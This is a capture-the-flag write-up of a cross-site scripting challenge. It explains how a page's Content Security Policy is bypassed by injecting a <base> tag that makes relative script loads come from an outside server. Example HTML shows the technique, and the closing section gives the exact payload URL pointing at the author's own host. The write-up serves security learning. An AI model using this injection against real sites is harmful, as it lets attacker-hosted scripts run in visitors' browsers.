# XSS Mitigation Demo

Inject an alert("Wizer").

# Solution

This was an interesting one.. I wasn't as "into it" at first, so it took me longer than usual.. 

It's obviously a CSP bypass vuln.. They reflect anything you submit but due to CSP you can't just submit something like `<script>alert("Wizer");</script>` due to the CSP, it won't run..

## Failures

I first tried to submit a payload that would break out of my `<p>` tag and run into the existing `<script>` tag, therefore using the existing nonce. But that was always off by a character.

## Keep a Solid Base

Then, due to having created a CSP for some chat-app I was writing, I knew you could run the CSP through an auditor/evaluator and it would tell you where you are still vulnerable. Well, I ran the site through [this evaluator](https://csp-evaluator.withgoogle.com/) and it told me the site was vulnerable to `<base>` tag abuse.

Base tag abuse is where you essentially provide the 'root' URL for all resources loaded on a page but via an HTML tag (the `<base>` tag). Specifically, the `href` attribute : eg.. `<base href="https://some-server.com">`

For example, if you had a server hosted at `https://foo.com` and the HTML looked like this:

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <!-- THIS SCRIPT -->
  <script src="/script.js"></script>
</body>
</html>
```

..it would try to load the script from `https://foo.com/script.js`.

But if you had this HTML...

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <!-- I believe you would normally put the base tag in the head, but this still works -->
  <base href="https://bar.org">
  <!-- THIS SCRIPT -->
  <script src="/script.js"></script>
</body>
</html>
```

..it would try to load `/script.js` from `https://bar.org/script.js` (even though the site you are currently at is `https://foo.com`)... due to the `<base>` tag. 

## Done

So after trying to host a GitHub Gist with `alert("Wizer")` and failing, I just setup a little test server on Render[dot]com to host my `script.js` and bam, it worked! Ultimately, this was the payload : `https://chal48-avu8s.vercel.app/?input=<base+href="https://rtchat-pentest.onrender.com/"+/>` (I have since removed that route, so people can't cheat lol I doubt anyone reads these though)...